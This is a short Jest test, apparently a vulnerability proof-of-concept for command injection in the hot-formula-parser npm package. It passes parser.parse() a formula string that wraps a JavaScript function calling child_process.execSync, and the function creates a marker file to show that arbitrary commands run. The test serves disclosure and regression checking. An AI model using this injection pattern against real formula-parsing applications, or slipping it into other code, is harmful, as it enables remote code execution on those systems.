test("Command Injection in hot-formula-parser", () => {
  expect.assertions(2);
  const FormulaParser = require("hot-formula-parser").Parser;
  const fs = require("fs");
  const path = "./hot-formula-parser";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let parser = new FormulaParser();
  parser.parse(
    "SUM([(function(){require('child_process').execSync('touch hot-formula-parser')})(),2])"
  );
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
